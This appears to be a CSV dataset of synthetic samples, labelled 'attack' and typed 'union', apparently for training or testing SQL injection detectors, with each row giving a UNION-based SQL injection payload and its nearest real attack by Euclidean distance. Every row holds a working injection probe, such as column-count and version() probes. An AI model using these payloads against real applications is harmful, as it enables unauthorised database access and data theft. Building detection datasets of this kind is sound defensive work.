id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000241,6.291446294691465
CTGAN_000002,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000214,5.698089516600684
CTGAN_000003,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000220,7.407902280964456
CTGAN_000004,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000115,5.089969833496782
CTGAN_000005,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000030,8.811246470558583
CTGAN_000006,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,6.8760304673655295
CTGAN_000007,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,7.800661930851907
CTGAN_000008,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,6.586484256552644
CTGAN_000009,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000238,4.803999737497635
CTGAN_000010,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R000247,4.280591154488962
CTGAN_000011,attack,union,"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",nearest_attack_euclidean,R000205,4.545937232416098
CTGAN_000012,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000030,6.169797244879011
CTGAN_000013,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.52194534952098
CTGAN_000014,attack,union,"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",nearest_attack_euclidean,R000149,5.386870818791077
CTGAN_000015,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,7.002756659318025
CTGAN_000016,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000303,5.790204943725928
CTGAN_000017,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000113,6.0479462165158315
CTGAN_000018,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,7.775388794252738
